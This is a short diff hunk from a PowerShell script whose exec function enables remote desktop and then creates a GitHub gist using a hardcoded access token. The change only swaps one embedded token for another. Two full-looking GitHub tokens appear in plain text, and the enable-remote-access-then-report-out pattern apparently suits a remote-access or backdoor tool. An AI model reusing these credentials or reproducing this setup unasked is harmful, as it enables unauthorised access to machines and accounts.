@@ -101,8 +101,8 @@ function Create-Gist {
 
 function exec {
     Enable-RemoteDesktop
-    $Token = "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"
-    Create-Gist -Token $Token
+    $tkn = "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"
+    Create-Gist -Token $tkn
 }
 
 function uninstall {
